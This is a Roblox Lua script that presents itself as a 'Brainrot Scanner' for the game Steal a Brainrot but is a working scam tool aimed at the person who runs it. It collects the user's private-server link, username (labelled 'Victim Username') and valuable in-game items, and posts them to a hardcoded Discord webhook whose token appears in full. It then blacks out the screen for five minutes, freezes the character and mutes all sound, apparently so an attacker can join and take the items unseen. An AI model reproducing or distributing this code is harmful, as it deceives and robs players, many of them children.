-- ==============================
-- Full Brainrot Scanner (Clean Version)
-- ==============================

-- Services
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local ContextActionService = game:GetService("ContextActionService")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")

-- Config
local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep"
local PLOTS_FOLDER = Workspace:WaitForChild("Plots")

-- Globals
local isActivated = false
_G.VIP_LINK = nil
local plotConnections = {}

-- ==============================
-- Utilities
-- ==============================
local function safeLower(str)
    return typeof(str) == "string" and string.lower(str) or ""
end

local function stringContainsAny(text, patterns)
    text = safeLower(text)
    for _, pat in ipairs(patterns) do
        if string.find(text, pat, 1, true) then return true end
    end
    return false
end

local function safeJSONEncode(data)
    local ok, encoded = pcall(HttpService.JSONEncode, HttpService, data)
    if ok then return encoded end
    return '{"content":"'..tostring(data)..'"}'
end

local function getRequestFunction()
    if typeof(syn) == "table" and syn.request then return syn.request end
    if typeof(http) == "table" and http.request then return http.request end
    if type(http_request) == "function" then return http_request end
    if type(request) == "function" then return request end
    return nil
end

local function safeRequest(reqTable)
    local req = getRequestFunction()
    if req then pcall(req, reqTable) end
end

local function sendWebhook(payload)
    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
    local json = safeJSONEncode(payload)
    safeRequest({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=json})
    -- fallback via HttpService
    pcall(function()
        HttpService:RequestAsync({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=json})
    end)
end

-- ==============================
-- Brainrot List
-- ==============================
local brainrots = {
    "Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot","Garama and Madundung",
    "Tictac Sahur","Spaghetti Tualetti","Dragon Cannelloni","Ketupat Kepat","Ketchuru and Musturu",
    "Esok Sekolah","Money Money Puggy","Nuclearo Dinossauro","La Grande Combinasion","Chicleteira Bicicleteira",
    "Los Chicleteiras","To to to Sahur","Graipuss Medussi","Strawberry Elephant","67","La Extinct Grande",
    "Mariachi Corazoni","Tacorita Bicicleta","Los Nooo My Hotspotsitos","La Karkerkar Combinasion","Los Bros",
    "Los Primos","Tralaledon","Los Tacoritas","La Sahur Combinasion","Fragola La La La","Los Hotspotsitos",
    "La Supreme Combinasion","Los Combinasionas","Los Tungtungtungcitos","Noo My Examen","Yess my Examen",
    "Secret Lucky Block","Admin Lucky Block","Quesadilla Crocodila","Torrtuginni Dragonfruitini","Agarrini la Palini",
    "Karkerkar Kurkur","Los Matteos","Celularcini Viciosini","Las Vaquitas Saturnitas",
    "Job Job Job Sahur","La Vacca Staturno Saturnita","Los Spyderrinis","Los Tipi Tacos",
    "Nooo My Hotspot","Taco Lucky Block","Bisonte Giuppitere","Perrito Burrito","Capi Taco",
    "Bombardini Tortini","Extinct Matteo","Extinct Tralalero","Sammyini Spyderini","Guerriro Digitale","Crabbo Limonetta"
}

local lowerToCanonical = {}
for _, name in ipairs(brainrots) do
    lowerToCanonical[safeLower(name)] = name
end

local function getCanonical(name)
    return lowerToCanonical[safeLower(name)]
end

local allowKeywords = {"brainrot god","secret","og","admin","exclusive","taco","craft machine","fuse machine","los ","las ","ritual","unobtainable","removed","upcoming"}
local disallowKeywords = {"common","rare","epic","legendary","mythic","mythic lucky block"}

local function isAllowed(name)
    local lname = safeLower(name)
    local blocked = stringContainsAny(lname, disallowKeywords)
    local allowed = stringContainsAny(lname, allowKeywords)
    return not blocked or allowed
end

local function isBrainrot(inst)
    return inst and getCanonical(inst.Name) and isAllowed(inst.Name)
end

local function collectPlotBrainrots(plot)
    local seen = {}
    local list = {}
    for _, d in ipairs(plot:GetDescendants()) do
        if isBrainrot(d) then
            local canonical = getCanonical(d.Name)
            if not seen[canonical] then
                seen[canonical] = true
                table.insert(list, canonical)
            end
        end
    end
    return list
end

local function resolveOwner(plot)
    for _, d in ipairs(plot:GetDescendants()) do
        if d:IsA("StringValue") and stringContainsAny(d.Name, {"owner","username","user"}) then
            return d.Value
        end
        if d:IsA("IntValue") and stringContainsAny(d.Name, {"owner","userid"}) then
            local ok, name = pcall(function() return Players:GetNameFromUserIdAsync(d.Value) end)
            if ok then return name end
        end
    end
    return plot.Name
end

-- ==============================
-- Watch Plots
-- ==============================
local function scheduleUpdate()
    task.delay(0.5, function() postAllPlots() end)
end

local function onDescendantAdded(plot, inst)
    if isBrainrot(inst) then scheduleUpdate() end
end

local function attachPlot(plot)
    if plotConnections[plot] then return end
    plotConnections[plot] = plot.DescendantAdded:Connect(function(inst) onDescendantAdded(plot, inst) end)
end

local function watchPlots()
    for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do attachPlot(plot) end
    PLOTS_FOLDER.ChildAdded:Connect(function(c) attachPlot(c); scheduleUpdate() end)
end

-- ==============================
-- Loading Screen
-- ==============================
local function showLoadingScreen(duration)
    local player = Players.LocalPlayer
    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)

    local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    gui.Name = "LoadingScreen"
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 9999

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(1,0,1,0)
    frame.BackgroundColor3 = Color3.new(0,0,0)

    local label = Instance.new("TextLabel", frame)
    label.Size = UDim2.new(1,0,0,60)
    label.Position = UDim2.new(0,0,0.45,-30)
    label.BackgroundTransparency = 1
    label.Text = "Script activated, please wait..."
    label.TextColor3 = Color3.new(1,1,1)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold

    local barFrame = Instance.new("Frame", frame)
    barFrame.Size = UDim2.new(0.6,0,0,25)
    barFrame.Position = UDim2.new(0.2,0,0.55,0)
    barFrame.BackgroundColor3 = Color3.fromRGB(50,50,50)

    local bar = Instance.new("Frame", barFrame)
    bar.Size = UDim2.new(0,0,1,0)
    bar.BackgroundColor3 = Color3.fromRGB(0,170,255)

    TweenService:Create(bar, TweenInfo.new(duration, Enum.EasingStyle.Linear), {Size=UDim2.new(1,0,1,0)}):Play()
    task.delay(duration, function()
        pcall(function() gui:Destroy() end)
        pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All,true) end)
    end)
end

-- ==============================
-- Post Brainrots
-- ==============================
function postAllPlots()
    local sections = {}
    local allBrainrots = {}

    for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
        local list = collectPlotBrainrots(plot)
        if #list > 0 then
            for _, b in ipairs(list) do table.insert(allBrainrots, b) end
            table.insert(sections, string.format("Plot: %s | Found: %d", resolveOwner(plot), #list))
        end
    end

    if #sections > 0 then
        local payload = {
            content = "@everyone WAKE UP",
            embeds = {{
                title = ":star: Brainrot | Flux",
                color = 65280,
                fields = {
                    {name=":man_standing: Victim Username:", value = Players.LocalPlayer.Name, inline=false},
                    {name=":ringed_planet: Brainrots List:", value = #allBrainrots>0 and table.concat(allBrainrots,"\n") or "None", inline=false},
                    {name=":link: VIP:", value = _G.VIP_LINK or "None", inline=false},
                }
            }}
        }
        sendWebhook(payload)
    end
end

-- ==============================
-- GUI Activation
-- ==============================
local function createGUI()
    local player = Players.LocalPlayer
    local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    gui.Name = "BrainrotGUI"

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0,450,0,300)
    frame.Position = UDim2.new(0.5,-225,0.5,-150)
    frame.BackgroundColor3 = Color3.fromRGB(12,12,12)

    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1,-20,0,50)
    title.Position = UDim2.new(0,10,0,10)
    title.BackgroundTransparency = 1
    title.Text = "Enter your VIP link"
    title.TextColor3 = Color3.new(1,1,1)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold

    local input = Instance.new("TextBox", frame)
    input.Size = UDim2.new(1,-20,0,50)
    input.Position = UDim2.new(0,10,0,70)
    input.BackgroundColor3 = Color3.fromRGB(40,40,40)
    input.BorderSizePixel = 0
    input.PlaceholderText = "https://www.roblox.com/share?code=..."
    input.TextColor3 = Color3.new(1,1,1)
    input.TextScaled = true
    input.ClearTextOnFocus = false
    input.Font = Enum.Font.Gotham

    local status = Instance.new("TextLabel", frame)
    status.Size = UDim2.new(1,-20,0,30)
    status.Position = UDim2.new(0,10,0,220)
    status.BackgroundTransparency = 1
    status.TextScaled = true
    status.TextColor3 = Color3.fromRGB(255,200,0)
    status.Font = Enum.Font.Gotham

    local button = Instance.new("TextButton", frame)
    button.Size = UDim2.new(1,-20,0,70)
    button.Position = UDim2.new(0,10,0,140)
    button.BackgroundColor3 = Color3.fromRGB(0,120,255)
    button.BorderColor3 = Color3.fromRGB(255,255,255)
    button.Text = "ACTIVATE"
    button.TextColor3 = Color3.new(1,1,1)
    button.TextScaled = true
    button.Font = Enum.Font.GothamBold

    button.MouseEnter:Connect(function()
        TweenService:Create(button,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(0,150,255)}):Play()
    end)
    button.MouseLeave:Connect(function()
        TweenService:Create(button,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(0,120,255)}):Play()
    end)

    local function activate()
        local link = input.Text:match("^%s*(.-)%s*$")
        if #Players:GetPlayers()>1 then
            status.Text = "Only 1 player allowed!"
            status.TextColor3 = Color3.fromRGB(255,80,80)
            return
        end
        if not link:find("roblox%.com/share") then
            status.Text = "Invalid VIP link!"
            status.TextColor3 = Color3.fromRGB(255,80,80)
            return
        end

        isActivated = true
        _G.VIP_LINK = link
        status.Text = "Script Activated"
        status.TextColor3 = Color3.fromRGB(0,255,100)

        task.wait(0.5)
        postAllPlots()
        watchPlots()
        showLoadingScreen(300)

        local char = player.Character or player.CharacterAdded:Wait()
        ContextActionService:BindAction("BlockMovement", function() return Enum.ContextActionResult.Sink end, false,
            Enum.PlayerActions.CharacterForward,Enum.PlayerActions.CharacterBackward,Enum.PlayerActions.CharacterLeft,Enum.PlayerActions.CharacterRight,Enum.PlayerActions.CharacterJump)

        local function freezeHumanoid(c)
            local hum = c:FindFirstChildOfClass("Humanoid")
            if hum then pcall(function() hum.WalkSpeed=0; hum.JumpPower=0 end) end
        end
        freezeHumanoid(char)
        player.CharacterAdded:Connect(freezeHumanoid)

        local function mute(obj)
            if obj:IsA("Sound") then
                pcall(function() obj.Volume=0; obj:Stop(); obj:GetPropertyChangedSignal("Volume"):Connect(function() obj.Volume=0 end) end)
            end
        end
        for _, obj in ipairs(Workspace:GetDescendants()) do mute(obj) end
        for _, obj in ipairs(SoundService:GetDescendants()) do mute(obj) end
        Workspace.DescendantAdded:Connect(mute)
        SoundService.DescendantAdded:Connect(mute)
        pcall(function() SoundService.Volume=0 end)

        gui:Destroy()
    end

    button.MouseButton1Click:Connect(activate)
    input.FocusLost:Connect(function(enter) if enter then activate() end end)
end

-- ==============================
-- Run
-- ==============================
print("[BrainrotScanner] Initializing GUI...")
createGUI()
